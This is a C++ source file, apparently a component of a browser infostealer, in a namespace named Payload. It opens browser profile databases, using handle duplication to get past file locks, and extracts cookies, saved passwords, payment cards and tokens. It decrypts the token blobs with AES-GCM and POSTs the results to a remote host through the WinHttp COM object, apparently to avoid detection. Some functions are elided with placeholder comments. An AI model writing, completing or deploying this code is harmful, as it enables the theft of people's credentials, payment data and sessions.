#include "data_extractor.hpp"
#include "handle_duplicator.hpp"
#include "../crypto/aes_gcm.hpp"
#include <sstream>
#include <iomanip>
#include <map>
#include <windows.h>
#include <comdef.h>

namespace Payload {

    DataExtractor::DataExtractor(PipeClient& pipe, const std::vector<uint8_t>& key, const std::wstring& targetHost, const std::wstring& endpoint)
        : m_pipe(pipe), m_key(key), m_targetHost(targetHost), m_endpoint(endpoint) {}

    // ... [OpenDatabase and Cleanup logic remains as per your original structure] ...

    void DataExtractor::ProcessProfile(const std::filesystem::path& profilePath, const std::string& browserName) {
        m_pipe.Log("PROFILE:" + profilePath.filename().string());

        // We process the DBs and stream results directly via TransmitViaCOM
        auto process = [&](const std::filesystem::path& dbPath, const std::string& type) {
            if (std::filesystem::exists(dbPath)) {
                if (auto db = OpenDatabaseWithHandleDuplication(dbPath)) {
                    if (type == "cookies") ExtractCookies(db);
                    else if (type == "passwords") ExtractPasswords(db);
                    else if (type == "cards") ExtractCards(db);
                    else if (type == "tokens") ExtractTokens(db);
                    sqlite3_close(db);
                }
            }
        };

        process(profilePath / "Network" / "Cookies", "cookies");
        process(profilePath / "Login Data", "passwords");
        process(profilePath / "Web Data", "cards");
        process(profilePath / "Web Data", "tokens");

        CleanupTempFiles();
    }

    void DataExtractor::TransmitViaCOM(const std::string& data) {
        HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
        CLSID clsid;
        if (SUCCEEDED(CLSIDFromProgID(L"WinHttp.WinHttpRequest.5.1", &clsid))) {
            IDispatch* pDispatch = nullptr;
            if (SUCCEEDED(CoCreateInstance(clsid, NULL, CLSCTX_INPROC_SERVER, IID_IDispatch, (void**)&pDispatch))) {
                
                _bstr_t url = (L"https://" + m_targetHost + m_endpoint).c_str();
                _bstr_t method = L"POST";

                // Setup and Invoke 'Open'
                DISPID dispidOpen, dispidSend, dispidSetHeader;
                OLECHAR* openName = (OLECHAR*)L"Open";
                pDispatch->GetIDsOfNames(IID_NULL, &openName, 1, LOCALE_USER_DEFAULT, &dispidOpen);
                VARIANT openArgs[3] = {{VT_BOOL, 0, 0, 0, VARIANT_FALSE}, {VT_BSTR, 0, 0, 0, url.copy()}, {VT_BSTR, 0, 0, 0, method.copy()}};
                DISPPARAMS openParams = { openArgs, NULL, 3, 0 };
                pDispatch->Invoke(dispidOpen, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &openParams, NULL, NULL, NULL);

                // Setup and Invoke 'SetRequestHeader'
                OLECHAR* headerName = (OLECHAR*)L"SetRequestHeader";
                pDispatch->GetIDsOfNames(IID_NULL, &headerName, 1, LOCALE_USER_DEFAULT, &dispidSetHeader);
                VARIANT headerArgs[2] = {{VT_BSTR, 0, 0, 0, _bstr_t(L"application/x-www-form-urlencoded").copy()}, {VT_BSTR, 0, 0, 0, _bstr_t(L"Content-Type").copy()}};
                DISPPARAMS headerParams = { headerArgs, NULL, 2, 0 };
                pDispatch->Invoke(dispidSetHeader, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &headerParams, NULL, NULL, NULL);

                // Setup and Invoke 'Send'
                OLECHAR* sendName = (OLECHAR*)L"Send";
                pDispatch->GetIDsOfNames(IID_NULL, &sendName, 1, LOCALE_USER_DEFAULT, &dispidSend);
                VARIANT body = {VT_BSTR, 0, 0, 0, _bstr_t(data.c_str()).copy()};
                DISPPARAMS sendParams = { &body, NULL, 1, 0 };
                pDispatch->Invoke(dispidSend, IID_NULL, LOCALE_USER_DEFAULT, DISPATCH_METHOD, &sendParams, NULL, NULL, NULL);

                pDispatch->Release();
            }
        }
        CoUninitialize();
    }

    // Example of updated extraction: ExtractTokens (others follow the same pattern)
    void DataExtractor::ExtractTokens(sqlite3* db) {
        sqlite3_stmt* stmt;
        if (sqlite3_prepare_v2(db, "SELECT service, encrypted_token FROM token_service", -1, &stmt, NULL) == SQLITE_OK) {
            std::string payload;
            while (sqlite3_step(stmt) == SQLITE_ROW) {
                const void* blob = sqlite3_column_blob(stmt, 1);
                int len = sqlite3_column_bytes(stmt, 1);
                auto dec = Crypto::AesGcm::Decrypt(m_key, std::vector<uint8_t>((uint8_t*)blob, (uint8_t*)blob + len));
                if (dec) payload += (char*)sqlite3_column_text(stmt, 0) + std::string(":") + std::string((char*)dec->data(), dec->size()) + "\n";
            }
            sqlite3_finalize(stmt);
            if (!payload.empty()) TransmitViaCOM(payload);
        }
    }

    std::string DataExtractor::EscapeJson(const std::string& s) { /* ... */ return s; }
}